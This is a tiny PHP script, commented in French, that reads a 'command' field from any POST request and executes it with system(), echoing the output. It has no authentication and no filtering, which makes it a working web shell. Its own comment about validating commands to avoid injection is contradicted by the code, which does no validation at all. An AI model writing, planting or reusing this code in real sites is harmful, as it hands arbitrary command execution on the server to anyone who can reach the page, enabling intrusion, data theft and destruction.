<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['command'])) {
    $command = $_POST['command'];

    // Évitez les injections en validant ou limitant les commandes exécutées.
    echo "<pre>";
    system($command);
    echo "</pre>";
} else {
    echo 'Aucune commande reçue.';
}
?>
